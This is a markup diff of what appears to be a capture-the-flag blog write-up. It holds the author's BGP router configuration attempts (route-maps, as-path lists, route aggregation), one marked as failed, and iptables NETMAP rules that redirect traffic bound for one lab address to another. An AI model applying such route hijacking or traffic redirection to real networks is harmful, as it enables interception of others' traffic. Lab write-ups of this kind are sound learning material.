 </code></pre>
 
-<p><img src="https://chickenpwny.github.io/images/carrier/analyzzeee5.PNG" alt="analyzzeee5" /></p>
+<p>clear ip bgp 10.78.10.2
+clear ip bgp 10.78.11.2</p>
 
-<pre><code>clear ip bgp 10.78.10.2
-clear ip bgp 10.78.11.2
-
-conf t
+<p>conf t
 router bgp 100
 no synchronization
-bgp always-compare-med 
-network 10.120.15.0/24
+bgp always-compare-med
+network 10.120.15.0/24</p>
 
-aggregate-address 10.120.0.0 255.255.0.0 summary-only
-bgp default local-preference 100
+<p>aggregate-address 10.120.0.0 255.255.0.0 summary-only
+bgp default local-preference 100</p>
 
-route-map to-as200 permit 10
-set metric 50
+<p>route-map to-as200 permit 10
+set metric 50</p>
 
-route-map to-as300 permit 10
-set metric 160
+<p>route-map to-as300 permit 10
+set metric 160</p>
 
-wr 
+<p>wr
 end
 wr
 wr
-wr
+wr</p>
 
+<p>sh ip bgp</p>
 
+<p>cp bgpd.conf.orig bgpd.conf</p>
 
-sh ip bgp
+<pre><code>
+Route-map 10, 20 references a set of conditions. When the first set of conditions 10 aren't met it moves to the next highest set of conditions. 
 
-cp bgpd.conf.orig bgpd.conf
+after you clear ip bgp it still leaves route-map elements. 
+
+in this attempt well through out all preconcived notions. 
+
 </code></pre>
 
-<p>Route-map 10, 20 references a set of conditions. When the first set of conditions 10 aren&rsquo;t met it moves to the next highest set of conditions.</p>
-
-<p>after you clear ip bgp it still leaves route-map elements.</p>
-
-<p>in this attempt well through out all preconcived notions.</p>
-
-<pre><code>clear ip bgp 10.78.10.2
+<p>clear ip bgp 10.78.10.2
 clear ip bgp 10.78.11.2
-clear ip bgp *
+clear ip bgp *</p>
 
-conf t
+<p>conf t
 router bgp 100
 default-metric 100
 neighbor 10.78.10.2 route-map to-as200 out
-neighbor 10.78.11.2 route-map to-as300 in
+neighbor 10.78.11.2 route-map to-as300 in</p>
 
-route-map to-as200 permit 10
+<p>route-map to-as200 permit 10
 match as-path 1
 set metric 2
 route-map to-as300 permit 10
 match as-path 2
-set metric 5
+set metric 5</p>
 
-ip as-path access-list 1 permit ^200$
+<p>ip as-path access-list 1 permit ^200$
 ip as-path access-list 2 permit ^300$
 end
-wr
+wr</p>
 
+<p>sh ip bgp</p>
 
-sh ip bgp
-
-cp bgpd.conf.orig bgpd.conf
-</code></pre>
-
-<pre><code>sudo iptables -t nat -F
-sudo iptables -t nat -A PREROUTING -d 10.1.1.2 -m ttl --ttl-gt 1 -j NETMAP --to 10.6.1.2
-sudo iptables -t nat -A POSTROUTING -s 10.6.1.2 -j NETMAP --to 10.1.1.2
-</code></pre>
+<p>cp bgpd.conf.orig bgpd.conf</p>
 
 <pre><code>
 </code></pre>
 
-<p>in this image</p>
+<p>sudo iptables -t nat -F
+sudo iptables -t nat -A PREROUTING -d 10.1.1.2 -m ttl &ndash;ttl-gt 1 -j NETMAP &ndash;to 10.6.1.2
+sudo iptables -t nat -A POSTROUTING -s 10.6.1.2 -j NETMAP &ndash;to 10.1.1.2</p>
 
-<p>10.78.10.2 connects to 200 on 10.78.11.2 connects via 300 to 200</p>
+<pre><code>
+</code></pre>
 
-<p>10.78.11.2 connects to 300 on 10.78.10.2 connects via 200 to 300</p>
+<pre><code>
+in this image 
 
-<p><img src="https://chickenpwny.github.io/images/carrier/analyzzeee6.PNG" alt="analyzzeee6" /></p>
+10.78.10.2 connects to 200 on 10.78.11.2 connects via 300 to 200
 
-<p><img src="https://chickenpwny.github.io/images/carrier/analyzzeee-map.png" alt="analyzzeee-map" /></p>
+10.78.11.2 connects to 300 on 10.78.10.2 connects via 200 to 300
 
-<h4 id="failed">FAILED</h4>
+![analyzzeee6](https://chickenpwny.github.io/images/carrier/analyzzeee6.PNG)
 
-<p>this attempt will be slightly different than the others i will clear the route tables first. then completely reconfigure the routers configuration. i will attempt to use the final solution at the end of the cisco case study guide.  i reassigned the interfaces, im telling the router . in the exampled i followed they used no synchron which isn&rsquo;t nessisary because that effects ibgp stuff in the same AS. defined the neighbors because i deleted the current configuration. which may have been why my changes didn&rsquo;t work.</p>
+![analyzzeee-map](https://chickenpwny.github.io/images/carrier/analyzzeee-map.png)
 
-<p>unknown commands it might be becauses its for ospf lol</p>
+#### FAILED 
 
-<pre><code>clear ip bgp
+this attempt will be slightly different than the others i will clear the route tables first. then completely reconfigure the routers configuration. i will attempt to use the final solution at the end of the cisco case study guide.  i reassigned the interfaces, im telling the router . in the exampled i followed they used no synchron which isn't nessisary because that effects ibgp stuff in the same AS. defined the neighbors because i deleted the current configuration. which may have been why my changes didn't work.  
 
-ip subnet-zero
+unknown commands it might be becauses its for ospf lol
+
+</code></pre>
+
+<p>clear ip bgp</p>
+
+<p>ip subnet-zero
 interface Loopback0
 ip address 10.99.64.2 255.255.255.0
 interface eth1
 ip address 10.78.10.2 255.255.255.0
 interface eth2
-ip address 10.78.11.2 255.255.255.0
+ip address 10.78.11.2 255.255.255.0</p>
 
-router bgp 100
+<p>router bgp 100
 network 10.120.0.0
 aggregate-address 10.120.15.0 255.255.255.0 suppress-map to-as300
 neighbor 10.78.10.2 remote-as 200
@@ -2154,20 +2278,20 @@ neighbor 10.78.11.2 route-map to-as300 in
 exit
 ip classless
 ip default-network 10.120.15.0
-ip as-pth access-list 1 permit ^300$
+ip as-pth access-list 1 permit ^300$</p>
 
-route-map to-as200 permit 20
+<p>route-map to-as200 permit 20
 match as-path 1
-set local-preference 300
+set local-preference 300</p>
 
-route-map to-as200 permit 10
+<p>route-map to-as200 permit 10
 match as-path 2
 set metric 200
 exit
-wr
+wr</p>
 
-cp bgpd.conf.orig bgpd.conf
-</code></pre>
+<p>cp bgpd.conf.orig bgpd.conf
+```</p>
 
 
     
